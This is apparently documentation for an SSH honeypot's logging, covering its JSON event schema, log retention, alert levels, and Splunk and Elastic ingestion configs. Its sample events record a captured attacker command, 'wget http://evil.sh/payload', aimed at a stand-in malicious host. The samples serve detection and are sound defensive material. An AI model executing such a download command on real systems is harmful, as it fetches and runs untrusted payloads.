# Logging & SIEM

Every event is a JSON line on stdout — captured natively by Docker and journald.
Set a log directory to additionally write the same lines to a daily-rotated file:

```toml
[logging]
dir            = "/data/logs"   # writes mimic.YYYY-MM-DD.jsonl here
# retention_days = 30           # optional; omit to keep logs forever
```

- Files are named `mimic.<date>.jsonl` and rotate once per day, so a shipper can
  tail `${dir}/mimic.*.jsonl`.
- **Logs are never deleted by default.** Set `retention_days = N` to delete
  rotated files older than `N` days. Pruning runs at startup, hourly thereafter,
  and again whenever the appender rotates, so the window holds across restarts
  and downtime rather than only while the sensor runs every day. Only this
  appender's own `mimic.<date>.jsonl` files are ever removed, so pointing `dir`
  at a directory holding other data is safe. Removals are logged as
  `log_retention_pruned`.
- Stdout logging stays on regardless, so `docker compose logs -f` /
  `journalctl -u mimic -f` keep working alongside the files.
- In Docker, point `dir` at a path on the writable `/data` volume (the compose
  stack pre-creates `/data/logs`); the container root filesystem is read-only.
- The directory is set to `0700` on Unix at startup: captured passwords are
  stored in cleartext, so the files must not be readable by other local users.
  This matters most for bare-metal deployments shared with other accounts.

When no `dir` is configured, storage and rotation are delegated to whatever
captures stdout:

- **Docker Compose** — the `json-file` driver
  ([docker-compose.yml](../docker-compose.yml)) rotates at 10 MB × 5 files. Use
  `docker compose logs -f` rather than reading Docker's internal storage.
- **systemd** — captured by journald ([deploy/mimic.service](../deploy/mimic.service));
  view with `journalctl -u mimic -f`, retention governed by your journald config.

## Event samples

```jsonc
// New connection
{"timestamp":"…","level":"INFO","fields":{"event":"connection_opened","sensor_name":"mimic","boot_id":"3f9c…","event_kind":"event","event_category":"intrusion_detection","event_dataset":"mimic.ssh","ecs_version":"8.11.0","session_id":42,"peer":"1.2.3.4:54321","src_ip":"1.2.3.4","src_port":54321}}

// Connection refused (over limit)
{"fields":{"event":"connection_rejected","sensor_name":"mimic","boot_id":"3f9c…","peer":"1.2.3.4:54322","src_ip":"1.2.3.4","src_port":54322,"reason":"per_ip_limit"}}

// Credential capture
{"fields":{"event":"auth_attempt","sensor_name":"mimic","boot_id":"3f9c…","session_id":42,"peer":"…","src_ip":"1.2.3.4","src_port":54321,"username":"root","method":"password","password":"hunter2","accepted":true}}

// Public key offered: the fingerprint is a pivotable IOC in a way a sprayed
// password rarely is, since attackers reuse key material across campaigns.
{"fields":{"event":"auth_attempt","sensor_name":"mimic","session_id":42,"username":"root","method":"publickey","fingerprint":"SHA256:6dq…","accepted":false}}

// The client's own SSH implementation — often the single most useful triage
// field for separating commodity botnets from targeted activity.
{"fields":{"event":"client_banner","sensor_name":"mimic","session_id":42,"banner":"SSH-2.0-libssh2_1.9.0"}}

// Command typed by attacker
{"fields":{"event":"command","sensor_name":"mimic","boot_id":"3f9c…","session_id":42,"peer":"…","command":"wget http://evil.sh/payload","source":"exec","status":0}}

// wget/curl download logged (no real request was made)
{"fields":{"event":"download","sensor_name":"mimic","session_id":42,"peer":"…","tool":"wget","url":"http://evil.sh/payload","dest":"/tmp/payload"}}

// Subsystem request (e.g. SFTP)
{"fields":{"event":"subsystem_request","sensor_name":"mimic","session_id":42,"peer":"…","subsystem":"sftp","accepted":true}}

// SCP/SFTP upload captured. `sha256` is the complete payload as it came off the
// wire — the hash to look up in an IOC feed. `stored_sha256` is what is on disk
// (and the quarantine filename); the two differ only when `truncated`.
// `stored_path` always uses `/` separators, so it is the same shape everywhere.
{"fields":{"event":"upload","sensor_name":"mimic","session_id":42,"peer":"…","name":"bot.elf","dest":"/tmp/bot.elf","size":98304,"sha256":"a3f…","stored_sha256":"a3f…","stored_path":"/data/quarantine/a3f…","truncated":false}}

// Session ended
{"fields":{"event":"connection_closed","sensor_name":"mimic","boot_id":"3f9c…","session_id":42,"peer":"…","duration_secs":37,"command_count":9}}
```

```bash
# Show all captured passwords
docker logs mimic | jq 'select(.fields.event=="auth_attempt") | {ip:.fields.peer, user:.fields.username, pass:.fields.password}'

# List downloaded URLs
docker logs mimic | jq 'select(.fields.event=="download") | .fields.url'
```

## Every event, and what carries it

Seventeen event types share one envelope. `sensor_name`, `boot_id`, `event_kind`,
`event_category`, `event_dataset` and `ecs_version` are on all of them;
everything that happens inside a session also carries `session_id`, `peer`,
`src_ip` and `src_port`. The last four are the ECS classification fields, emitted
by the sensor rather than bolted on by each operator's shipper — see
[Elastic / ECS](#elastic--ecs).

**Level is meant to be routable.** Two events are `WARN` because the attacker
achieved something: a login that worked, and a payload that landed. Failed
logins, commands and connections stay `INFO` — on an internet-facing sensor they
are the background radiation, and raising them would drown the two that matter.
The remaining `WARN`s (`accept_error`, `quarantine_session_cap`,
`quarantine_global_cap`, `quarantine_error`) are the sensor itself degrading. So
`level=WARN` alone is a usable alert filter with no lookup table.

| `event` | Level | Session-scoped | What it means |
|---|---|---|---|
| `listening` | INFO | no | The listener bound. Emitted once per process start. |
| `shutdown` | INFO | no | SIGTERM/SIGINT received; buffered log lines are flushed. |
| `accept_error` | WARN | no | The accept loop failed on one connection. |
| `log_retention_pruned` | INFO | no | The retention sweep deleted rotated log files past `logging.retention_days`. |
| `connection_rejected` | INFO | **no `session_id`** | Refused before a session existed (`per_ip_limit` / `global_limit`). |
| `connection_opened` | INFO | yes | A session was created. |
| `client_banner` | INFO | yes | The client's SSH version string, at first channel open. |
| `auth_attempt` | INFO / **WARN** if `accepted` | yes | A credential was offered. Carries `password` (cleartext) or a public-key `fingerprint`. |
| `command` | INFO | yes | A command line ran. Carries `source` and `status`. |
| `download` | INFO | yes | A remote endpoint was named (`wget`/`curl`/`nc`, or a `python3`/`perl` one-liner). No real request was made. |
| `subsystem_request` | INFO | yes | A subsystem (e.g. SFTP) was requested. |
| `upload` | WARN | yes | An SCP/SFTP payload was captured to the quarantine store. |
| `quarantine_session_cap` | WARN | yes | The session hit its real-disk write cap; the payload is still in the VFS. |
| `quarantine_global_cap` | WARN | yes | The honeypot hit its global quarantine storage cap; the payload is still in the VFS. |
| `quarantine_error` | WARN | yes | **A payload capture failed.** The one to page on when the sensor itself is the problem. |
| `session_timeout` | INFO | yes | *We* cut the session off, rather than the attacker leaving. |
| `connection_closed` | INFO | yes | Session ended. Carries `duration_secs` and `command_count`. |

Two caveats that produce silently wrong dashboards rather than errors:

- **Correlate on `boot_id` + `session_id`, never `session_id` alone.**
  `session_id` restarts at 1 on every process start, and the
  [daily reset](deployment.md#daily-reset) restarts the process every day — so a
  transaction keyed on `session_id` alone merges unrelated sessions into one
  apparent intrusion, with nothing in the data to indicate it happened.
- **`connection_rejected` has no `session_id`.** It precedes session creation, so
  any query that joins on `session_id` silently drops every rate-limited
  connection. If you are measuring flood volume, count these separately.

## `command` events: telling a bot from a human

```jsonc
{"fields":{"event":"command","sensor_name":"mimic","boot_id":"…","session_id":42,
           "peer":"1.2.3.4:54321","src_ip":"1.2.3.4","src_port":54321,
           "command":"wget http://evil.sh/payload","source":"exec","status":0}}
```

- `source` is `interactive` (typed at a PTY), `exec` (`ssh host 'cmd'`), `pipe`
  (a shell channel with no terminal), `heredoc`, `script` (one line of a body
  `sh` ran out of the VFS or off a pipe — the inside of a dropper, never typed by
  the client), or `transfer` (SCP). Anything other than `interactive` is close to
  a bot marker on its own.
- `status` is the exit code, or `-1` when the line is logged before it runs.
  **`status: 127` is the most useful single query a honeypot operator has** — it
  names the commands attackers expected to work that this box does not emulate,
  which is exactly the list worth implementing next.

```bash
# What are attackers reaching for that MIMIC does not have?
jq -r 'select(.fields.event=="command" and .fields.status==127) | .fields.command' \
  mimic.*.jsonl | awk '{print $1}' | sort | uniq -c | sort -rn | head -20

# Sessions that look manual rather than automated
jq -r 'select(.fields.event=="command" and .fields.source=="interactive")
       | .fields.session_id' mimic.*.jsonl | sort -u
```

## Splunk

Every field lands under `fields.*` because that is how `tracing`'s JSON formatter
nests them. Rather than carrying the `fields.` prefix through every SPL search
forever, rename once at index time:

```ini
# props.conf
[mimic:json]
INDEXED_EXTRACTIONS = json
KV_MODE             = none
TIME_PREFIX         = "timestamp":"
TIME_FORMAT         = %Y-%m-%dT%H:%M:%S.%6NZ
MAX_TIMESTAMP_LOOKAHEAD = 32
TRUNCATE            = 0
SHOULD_LINEMERGE    = false
FIELDALIAS-mimic    = fields.src_ip AS src_ip fields.src_port AS src_port \
                      fields.username AS user fields.event AS action \
                      fields.session_id AS session_id fields.boot_id AS boot_id
EVAL-app            = "mimic"
EVAL-vendor_product = "MIMIC SSH Honeypot"
```

```ini
# inputs.conf
[monitor:///data/logs/mimic.*.jsonl]
sourcetype = mimic:json
index      = honeypot
```

The `src_ip`/`user`/`action` aliases are the Splunk CIM Authentication and
Network Traffic names, so `auth_attempt` events drop into CIM-based dashboards
without further mapping.

## Elastic / ECS

The `peer` string is already split into `src_ip`/`src_port` by the honeypot and
the ECS classification fields are emitted by it too, so `filebeat.yml` is pure
renaming: no grok, and nothing synthesised in the shipper that could drift from
what the sensor actually is.

```yaml
filebeat.inputs:
  - type: filestream
    id: mimic
    paths: ["/data/logs/mimic.*.jsonl"]
    parsers:
      - ndjson:
          target: ""
          overwrite_keys: true
processors:
  - rename:
      fields:
        - { from: "fields.src_ip",     to: "source.ip" }
        - { from: "fields.src_port",   to: "source.port" }
        - { from: "fields.username",   to: "user.name" }
        - { from: "fields.event",      to: "event.action" }
        - { from: "fields.session_id", to: "event.id" }
        - { from: "fields.event_kind", to: "event.kind" }
        - { from: "fields.event_category", to: "event.category" }
        - { from: "fields.event_dataset", to: "event.dataset" }
        - { from: "fields.ecs_version", to: "ecs.version" }
      ignore_missing: true
```
